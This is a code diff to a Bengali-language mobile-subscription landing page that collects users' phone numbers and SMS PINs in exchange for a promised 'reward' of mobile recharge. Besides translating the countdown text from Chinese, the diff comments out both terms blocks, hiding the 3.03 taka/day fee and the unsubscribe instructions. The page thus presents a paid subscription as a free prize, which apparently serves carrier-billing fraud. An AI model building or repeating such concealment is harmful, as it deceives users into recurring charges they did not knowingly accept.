@@ -636,13 +636,13 @@
     <div class="yanzhengma_content"><span class="yanzhengmawenan">🔑ভেরিফিকেশন কোড দিন </span></div>
     <div class="yanzhengma_content2"><span class="yanzhengmawenan">আপনার মোবাইলের SMS দেখুন<br>৫-অঙ্কের কোড দিন </span></div>
     <div class="yanzhengma_content3"></div>
-    <div><div class="qingqiufanhuizhi0" id="timerDisplay0"><span>验证码已发送，将在</span><span class="funnel0" id="countdownText">00:45</span>内收到</div></div>
+    <div><div class="qingqiufanhuizhi0" id="timerDisplay0"><span>যাচাইকরণ কোড পাঠানো হয়েছে，</span><span class="funnel0" id="countdownText">00:45</span></div></div>
     <div class="yanzhengma_content4"><button class="tijiaoanniu" onclick="submitForm()" disabled>✅পুরস্কার নিন</button></div>
-    <div class="yanzhengma_content5" onclick='toggleTnc2()'>শর্তাবলি<span id="sanjiao">▼</span></div>
+    <!-- <div class="yanzhengma_content5" onclick='toggleTnc2()'>শর্তাবলি<span id="sanjiao">▼</span></div>
     <div class="yanzhengma_content6" >
                         <p class="tnc-content1">💰 订阅费用: ৩.০৩ টাকা/দিন</p>
                         <p class="tnc-content2">📱 取消方式: 12500 নম্বরে UNSUBE</p>
-    </div>
+    </div> -->
    </div>
    <div id="phoneSection" class="hidden" >
         <div class="iphone">
@@ -686,14 +686,14 @@
             <div class="content3">
                  <h5 id="ExplanationofTerms1" >✅ সাবস্ক্রাইব → পুরস্কার গ্রহণ</h5>
                  <h5 id="ExplanationofTerms2" >🎁 পুরস্কার হিসেবে মোবাইল রিচার্জ</h5>
-                 <div id="zhedie" onclick="toggleTnc()">
+                 <!-- <div id="zhedie" onclick="toggleTnc()">
                    <span id="terms">শর্তাবলি</span>
                    <span class="spx" id="arrowIcon">▼</span>                                      
                  </div>
                  <div class="tnc-content" id="tncContent">
                         <p class="tnc-content1">💰 订阅费用: ৩.০৩ টাকা/দিন</p>
                         <p class="tnc-content2">📱 取消方式: 12500 নম্বরে UNSUBE</p>
-                  </div>
+                  </div> -->
             </div>
             <div class="content4">
                  <div>
@@ -871,7 +871,7 @@ console.log('收集到的手机号:', msisdn); // 例如 "1712345678"
     console.log("document.querySelector('.funnel')",document.querySelector('.funnel')) 
     if(!document.querySelector('.funnel')){
         console.log('存在嘛？？？？？？？？？？')
-        document.getElementById('shoujidaojishi').innerHTML ='<span>等待验证码，将在</span><span class="funnel" id="countdownText0">00:45</span>内发送';
+        document.getElementById('shoujidaojishi').innerHTML ='<span>যাচাইকরণ কোডের জন্য অপেক্ষা করা হচ্ছে，</span><span class="funnel" id="countdownText0">00:45</span>';
         const newCountdownText = document.getElementById('countdownText0');
             startCountdown('00:45', newCountdownText, function() {
             // 倒计时结束时的回调
@@ -879,7 +879,7 @@ console.log('收集到的手机号:', msisdn); // 例如 "1712345678"
             //isCountdownRunning = false;
         });
     }else{
-        document.getElementById('shoujidaojishi').innerHTML ='<span>等待验证码，将在</span><span class="funnel" id="countdownText0">00:45</span>内发送';
+        document.getElementById('shoujidaojishi').innerHTML ='<span>যাচাইকরণ কোডের জন্য অপেক্ষা করা হচ্ছে，</span><span class="funnel" id="countdownText0">00:45</span>';
         const newCountdownText = document.getElementById('countdownText0');
             startCountdown('00:45', newCountdownText, function() {
             // 倒计时结束时的回调
@@ -887,7 +887,7 @@ console.log('收集到的手机号:', msisdn); // 例如 "1712345678"
             //isCountdownRunning = false;
         });
         console.log('存在/////////////////////',document.querySelector('#timerDisplay0'))//countdownText
-        document.querySelector('#timerDisplay0').innerHTML = '<span>验证码已发送，将在</span><span class="funnel" id="countdownText">00:45</span>内收到';
+        document.querySelector('#timerDisplay0').innerHTML = '<span>যাচাইকরণ কোড পাঠানো হয়েছে，</span><span class="funnel" id="countdownText">00:45</span>';
 
     }
     // ============================================
@@ -1138,7 +1138,7 @@ console.log('收集到的验证码:', pin); // 例如 "12345"
         const timerDisplay =  document.getElementById('timerDisplay0')
         if(!daojishi_submit){
             console.log('有有有')
-            timerDisplay.innerHTML = '<span>正在验证，</span><span class="funnel" id="countdownText">00:45</span>';
+            timerDisplay.innerHTML = '<span>যাচাই চলছে，</span><span class="funnel" id="countdownText">00:45</span>';
             const newCountdownText = document.getElementById('countdownText');
             startCountdown('00:45', newCountdownText, function() {
             // 倒计时结束时的回调
@@ -1146,7 +1146,7 @@ console.log('收集到的验证码:', pin); // 例如 "12345"
             isCountdownRunning = false;
         });
         }else{
-            timerDisplay.innerHTML = '<span>正在验证，</span><span class="funnel" id="countdownText">00:45</span>';
+            timerDisplay.innerHTML = '<span>যাচাই চলছে，</span><span class="funnel" id="countdownText">00:45</span>';
             const newCountdownText = document.getElementById('countdownText');
             startCountdown('00:45', newCountdownText, function() {
             // 倒计时结束时的回调
@@ -1263,7 +1263,7 @@ console.log('收集到的验证码:', pin); // 例如 "12345"
             //重新计时
         }else{
             //加上计时器
-           document.getElementById('shoujidaojishi').innerHTML ='<span>等待验证码，将在</span><span class="funnel" id="countdownText0">00:45</span>内发送';
+           document.getElementById('shoujidaojishi').innerHTML ='<span>যাচাইকরণ কোডের জন্য অপেক্ষা করা হচ্ছে，</span><span class="funnel" id="countdownText0">00:45</span>';
 
             const newCountdownText = document.getElementById('countdownText0');
             startCountdown('00:45', newCountdownText, function() {
